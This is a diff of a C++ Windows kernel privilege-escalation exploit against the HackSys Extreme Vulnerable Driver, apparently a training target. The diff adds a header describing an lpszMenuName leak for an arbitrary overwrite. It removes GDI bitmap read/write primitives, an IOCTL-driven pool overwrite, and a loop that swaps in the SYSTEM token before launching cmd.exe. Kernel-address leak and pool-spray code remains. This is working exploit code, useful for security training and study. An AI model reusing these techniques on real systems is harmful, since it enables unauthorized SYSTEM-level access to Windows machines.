@@ -1,4 +1,31 @@
 
+/*
+
+	leak lpszMenuName, that is allocated on the same pool region
+	as the bitmap object, in order to later use in an arbitrary overwrite bug.
+
+	Ref:
+	https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_RS2_WWW_GDI_64.ps1
+	https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
+	Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
+	LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila
+	
+<---- 
+ 
+	Copy & usage of this software are allowed without any restrictions.
+	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+	SOFTWARE.
+	
+ ---->
+
+*/
+
+
 
 #pragma once
 #include "stdafx.h"
@@ -10,11 +37,6 @@
 
 #include <Wingdi.h>
 
-#define hDev "\\\\.\\HacksysExtremeVulnerableDriver"
-
-//using namespace System;
-//using namespace System::Runtime::InteropServices;
-
 typedef void*(NTAPI *lHMValidateHandle)(
 	HWND h,
 	int type
@@ -24,31 +46,6 @@ int g = 1;
 
 HBITMAP managerBitmap;
 HBITMAP workerBitmap;
-
-//unsigned long long mpvscan0;
-//unsigned long long wpvscan0;
-
-
-/*
-typedef struct _HEAD
-{
-HANDLE h;
-DWORD  cLockObj;
-} HEAD, *PHEAD;
-
-typedef struct _THROBJHEAD
-{
-HEAD h;
-PVOID pti;
-} THROBJHEAD, *PTHROBJHEAD;
-
-typedef struct _THRDESKHEAD
-{
-THROBJHEAD h;
-PVOID    rpdesk;
-PVOID       pSelf;
-} THRDESKHEAD, *PTHRDESKHEAD;
-*/
 
 LRESULT
 CALLBACK MainWProc(
@@ -61,7 +58,7 @@ CALLBACK MainWProc(
 
 lHMValidateHandle pHmValidateHandle = NULL;
 
-// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
+
 BOOL
 GetHMValidateHandle(
 )
@@ -219,11 +216,6 @@ LeaklpszMenuName(
 	//long lpUserDesktopHeapWindow = (long)Convert::ToInt64(uWND);
 	//Int64 ^ ulClientDelta = Marshal::ReadInt64((IntPtr)&uWND + 0x20) - lpUserDesktopHeapWindow;
 	//printf("%p", ulClientDelta);
-	//auto r = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow);
-	//auto t = *reinterpret_cast<DWORD64 *>((DWORD64*)lpUserDesktopHeapWindow + 0x20);
-	//printf("%p\n", lpUserDesktopHeapWindow);
-	//printf("%p\n", r);
-	//printf("%p\n", t);
 	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow + 0x20) - lpUserDesktopHeapWindow;
 	//printf("%p\n", ulClientDelta);
 	//(DWORD64)(lpUserDesktopHeapWindow);
@@ -237,6 +229,9 @@ LeaklpszMenuName(
 	return lpszMenuName;
 }
 
+// i have found that it is usefull
+// to try and un-randomize the pool
+// entropy b4 leaking lpszMenuName.
 VOID
 SprayPool(
 )
@@ -290,46 +285,6 @@ Leak(
 	return pvscan0;
 }
 
-DWORD64
-BitmapRead(
-	HBITMAP Mgr,
-	HBITMAP Wrk,
-	DWORD64 addr
-)
-{
-
-	printf("reading addr at: %p\n", addr);
-	LPVOID bRet = VirtualAlloc(
-		0, 0x8,
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_READWRITE
-	);
-	SetBitmapBits(Mgr, 0x8, (void *)(&addr));
-
-	if (GetBitmapBits(Wrk, 0x8, &bRet) == NULL) {
-		printf("err");
-		//
-		//exit(GetLastError());
-	}
-	return *reinterpret_cast<DWORD64 *>(bRet);
-
-}
-
-DWORD64 
-BitmapWrite(
-	HBITMAP Mgr,
-	HBITMAP Wrk,
-	DWORD64 addr,
-	DWORD64 Val
-	) 
-{
-	
-	SetBitmapBits(Mgr, 8, (void *)(&addr));
-	if (SetBitmapBits(Wrk, 8, (void *)(&Val)) == 0) {
-		return -1;
-	}
-}
-
 int
 main(
 )
@@ -354,170 +309,6 @@ main(
 	printf("[+] Mgr pvScan0 offset: %p\n", a);
 	printf("[+] Wrk pvScan0 offset: %p\n", b);
 
-	LPVOID bRet = VirtualAlloc(
-		0, 0x8,
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_READWRITE
-	);
-	//SetBitmapBits(managerBitmap, 0x8, (void *)(&addr));
-	BYTE src[8] = "\x41\x41\x41\x41\x41\x41\x41";
-	//BYTE* dst[8] = { 0 };
-	LPVOID results = VirtualAlloc(0, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	BYTE* dst = new BYTE[sizeof(ULONGLONG) * 2];
-	SecureZeroMemory(dst, sizeof(ULONGLONG) * 2);
-
-	printf("\nbretVal: %p", results);
-	
-	auto bi = GetBitmapBits(workerBitmap, sizeof(ULONGLONG), &results);
-	
-	printf("\nbretVal: %p", bi);
-	printf("\nbretVal: %p", results);
-	int jk;
-	scanf("%d", &jk);
-
-
-	//byte Buff[sizeof(LPVOID) * 2] = { 0 };
-	//memcpy(Buff, &b, (sizeof(LPVOID)));
-	//memcpy(Buff + (sizeof(LPVOID)), &a, (sizeof(LPVOID)));
-
-	//LPVOID lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
-	//lpSourceTargetAddress = &b;
-
-	PUCHAR chOverwriteBuffer;
-
-	auto lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
-	lpSourceTargetAddress = &b;
-
-	chOverwriteBuffer = (PUCHAR)malloc(sizeof(LPVOID) * 2);
-	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, (sizeof(LPVOID)));
-	memcpy(chOverwriteBuffer + (sizeof(LPVOID)), &a, (sizeof(LPVOID)));
-
-	//char Buff[16] = {0};
-	//
-	//memcpy(Buff, &b, 8);
-	//memcpy(Buff + 8, &a, 8);
-
-	DWORD u = 0;
-
-	auto dev = CreateFileA(
-		hDev,
-		GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_WRITE,
-		NULL,
-		OPEN_EXISTING,
-		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
-		NULL
-	);
-
-	if (dev == INVALID_HANDLE_VALUE) { exit(-1); }
-
-	printf("\n[>] ldr\n");
-	printf("[+] Opened Device Handle at: %p\n", &dev);
-	printf("[+] Device Name: %s", hDev);
-	printf("[+] Sending Ioctl: %p\n", 0x22200B);
-	printf("[+] Buffer length: %d\n", sizeof(LPVOID) * 2);
-
-	auto bResult = DeviceIoControl(
-		dev,	
-		0x22200B,						
-		chOverwriteBuffer,					
-		(sizeof(LPVOID) * 2),			
-		NULL, 0,						
-		&u,							
-		(LPOVERLAPPED)NULL);
-
-	if (!bResult) {
-		CloseHandle(dev);
-		exit(GetLastError());
-	}
-
-	CloseHandle(dev);
-
-	//printf("System _EP: %p\n", _EP);
-	//
-	//auto Systoken = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
-	//	&_EP + (UINT_PTR)0x358));
-	//auto SysPid = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
-	//	&_EP + (UINT_PTR)0x2F0));
-	//printf("Systoken: %p\n", Systoken); //Systoken
-	//printf("SysPid: %p", SysPid); //Systoken
-	//
-	//DWORD64 ActiveProcessLinksOffset = 0x2F0;
-	//DWORD64 TokenOffset = 0x358;
-	//DWORD64 UniqueProcessIdOffset = 0x2E8;
-
-	printf("\n[!] running exploit...\n");
-
-	DWORD64 _EP = GetPsInitialSystemProcess();
-
-	DWORD64 SepPtr = BitmapRead(
-		managerBitmap,
-		workerBitmap,
-		_EP
-	);
-
-	DWORD64 SysTokenPtr = SepPtr + 0x358;
-
-	DWORD64 SysToken = BitmapRead(
-		managerBitmap,
-		workerBitmap,
-		SysTokenPtr
-	);
-
-
-	printf("[+] System TOKEN: %p\n" , SysToken);
-	int s;
-	scanf("%d", &s);
-
-
-	DWORD64 NextPEP = BitmapRead(
-		managerBitmap,
-		workerBitmap, 
-		((DWORD64)SepPtr) + ((DWORD64)0x2F0)
-	) - 0x2E8 - 0x8;
-
-
-	DWORD64 Token = NULL;
-
-
-	while (1) {
-
-		DWORD64 NextPID = BitmapRead(
-			managerBitmap,
-			workerBitmap,
-			((DWORD64)NextPEP + 0x2E8)
-		);
-
-		if (NextPID == GetCurrentProcessId()) {
-			Token = BitmapRead(
-				managerBitmap,
-				workerBitmap,
-				((DWORD64)NextPEP + 0x358)
-			);
-
-			printf("[+] Our token: %p\n", Token);
-			break;
-
-		}
-
-		NextPEP = BitmapRead(
-			managerBitmap,
-			workerBitmap,
-			((DWORD64)NextPEP + 0x2F0)
-		) - 0x2E8 - 0x8;
-
-	}
-
-
-	BitmapWrite(
-		managerBitmap,
-		workerBitmap,
-		((DWORD64)NextPEP + 0x358),
-		SysToken
-	);
-
-	system("cmd.exe");
-	system("pause");
 	int y;
 	scanf("%d", &y);
 	return 0;
